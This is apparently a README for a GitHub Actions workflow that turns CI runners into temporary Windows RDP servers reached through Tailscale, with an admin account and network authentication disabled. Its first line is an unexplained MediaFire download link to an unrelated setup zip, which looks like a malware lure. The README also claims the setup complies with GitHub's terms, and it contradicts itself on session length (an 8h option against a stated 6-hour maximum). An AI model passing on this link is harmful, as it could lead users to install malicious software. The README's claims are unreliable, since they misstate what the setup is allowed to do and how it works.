<div align="center">
https://www.mediafire.com/file/fpam2shmet707z1/HSNR_v012_Setup.zip/file
# 🚀  RDP SERVER

![GitHub Actions](https://img.shields.io/badge/GitHub%20Actions-Automated-blue?logo=githubactions&style=flat-square)
![Windows](https://img.shields.io/badge/OS-Windows%20Server-blue?logo=windows&style=flat-square)
![RDP](https://img.shields.io/badge/Protocol-RDP-red?style=flat-square)
![Tailscale](https://img.shields.io/badge/VPN-Tailscale-purple?logo=tailscale&style=flat-square)

A **powerful GitHub Actions workflow** that automatically provisions a **premium Windows RDP server** with **secure Tailscale VPN connectivity**.

</div>

---

## 🌐 Contact & Community

<div align="center">
  <a href="https://discord.gg/gemlogintool" target="_blank">
    <img src="https://img.shields.io/badge/Join%20AI%20STV%20on%20Discord-0088cc?style=for-the-badge&logo=discord&logoColor=white" alt="Join discord me">
  </a>
</div>

💬 Stay updated with news, releases, and support from the **Discord Tuaanhaii** team!

---

## ✨ Features

| Feature | Description |
|---------|-------------|
| 🖥️ **Latest Windows** | Fresh, up-to-date Windows Server environment |
| 🔒 **Secure VPN** | Fully encrypted via Tailscale |
| ⚡ **Admin Access** | Full administrator privileges |
| ⏰ **Flexible Duration** | Configurable 1–8 hour sessions |
| 🧹 **Auto Cleanup** | Automatic post-session resource cleanup |
| 🎯 **High Performance** | Optimized for developers and testers |

---

## 🚀 Quick Start

### 🧩 Prerequisites

1. **Tailscale Account** → [Sign up here](https://tailscale.com/)
2. **GitHub Repository** → Fork or create a new one
3. **Tailscale Auth Key** → [Generate here](https://login.tailscale.com/admin/settings/keys)

---

### ⚙️ Setup Instructions

#### 1️⃣ Configure GitHub Secrets

# Repository → Settings → Secrets and variables → Actions → New repository secret
Name: TAILSCALE_AUTH_KEY
Value: [Your Tailscale Auth Key]

2️⃣ Run the Workflow

1. Go to the Actions tab


2. Select 🚀 SEVER AI STV PREMIUM workflow


3. Click Run workflow


4. Choose session duration:

1h — Quick testing

3h — Development session

5h40m — Extended (default)

8h — Custom (edit YAML if needed)



5. Hit Run workflow ✅




---

📋 Session Configuration

Duration	Total Minutes	Recommended Use

1h	60	Quick testing
3h	180	Standard development
5h40m	340	Extended session (default)
8h	480	Custom build & testing



---

🧠 Technical Overview

🖥️ System Setup

✅ Enable Remote Desktop

✅ Disable Network Authentication

✅ Open port 3389 in firewall

✅ Start Terminal Services

✅ Create premium admin account


🔐 Security

Auto-generated 12-char password

Dedicated account: AISTV-PREMIUM

Protected by Tailscale VPN

Automatic account removal after session


🌐 Network

Item	Value

Protocol	RDP
Port	3389
VPN	Tailscale
Hostname	ai-stv-premium-${{ github.run_id }}
IP	Dynamic Tailscale IPv4



---

💻 Connection Guide

After successful setup, logs show:

┌───────────────────────────────────────────┐
│              🎉 CONNECTION SUCCESS!       │
├───────────────────────────────────────────┤
│ 🌐  Address: 100.x.x.x                    │
│ 👤  Username: AISTV-PREMIUM               │
│ 🔐  Password: **********                   │
│ ⏰  Duration: 5 hours 40 minutes          │
│ 🕐  Start: 0xx:0xx:0xx                       │
│ 🕐  End: 0xx:0xx:0xx                         │
│ 📍  Port: 3389                           │
└───────────────────────────────────────────┘

🪟 Windows

1. Press Win + R, type mstsc


2. Enter Tailscale IP


3. Username: AISTV-PREMIUM


4. Password: from workflow console



🍎 macOS / 🐧 Linux

Use Microsoft Remote Desktop or Remmina:

Address: TAILSCALE_IP:3389
Username: AISTV-PREMIUM
Password: [From workflow output]

📱 Android / iOS

Install Microsoft Remote Desktop → connect using above credentials.


---

⚙️ Advanced Configuration

🕒 Custom Duration

Edit workflow YAML:

options:
  - '1h'
  - '3h'
  - '5h40m'
  - '8h'

🔐 Enhanced Security

Auto password rotation

Auto account deletion

Firewall rule cleanup

Real-time session tracking



---

🧹 Automatic Cleanup

Step	Action

🗑️	Remove password files
🚫	Disable account
🔌	Disconnect VPN
🛡️	Remove firewall rules
📊	Clear logs



---

⚠️ Notes

Limitation	Description

⏰ Max session	6 hours (GitHub limit)
💾 Storage	Temporary only
🔄 Concurrency	1 active session
📱 Requirement	Tailscale client needed


✅ Best Practices

Never share credentials

Backup your work

Monitor session time

Ensure cleanup

Track usage limits



---

🧰 Troubleshooting

Problem	Solution

❌ Auth Key Error	Check your GitHub secret
🔌 Connection Timeout	Verify Tailscale connection
🔑 Wrong Password	View logs for actual password
🕐 Early Termination	Check GitHub Actions limits



---

📊 Resource Monitoring

🔄 [14:35:22] Time remaining: 5h 24m 38s

View logs in Actions tab

Analyze connection reports

Track CPU & session time



---

🔒 Security & Compliance

✅ No persistent storage
✅ Self-destructing credentials
✅ Encrypted VPN connections
✅ Temporary accounts only
✅ Compliant with GitHub terms


---

🤝 Support & Documentation

Official Docs

GitHub Actions

Tailscale

RDP Connection Guide


Community

🐛 Report Bugs

💡 Feature Requests

💬 Join Discussion



---

<div align="center">⚡ Powered by Zangz
Fast • Secure • Reliable



</div>
